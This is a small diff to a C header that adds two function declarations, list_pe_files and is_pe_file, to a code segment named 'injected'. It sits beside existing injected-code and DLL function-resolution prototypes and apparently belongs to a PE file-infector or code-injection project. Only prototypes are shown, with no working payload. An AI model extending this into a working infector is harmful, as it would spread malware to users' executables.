@@ -25,4 +25,9 @@ PVOID       get_func(PCHAR name, PVOID dllBase);
 __declspec(code_seg("injected"))
 void       inj_code_c();
 
+__declspec(code_seg("injected"))
+void list_pe_files();
+
+__declspec(code_seg("injected"))
+int is_pe_file(LPCTSTR filename, PVOID dll);
 #endif
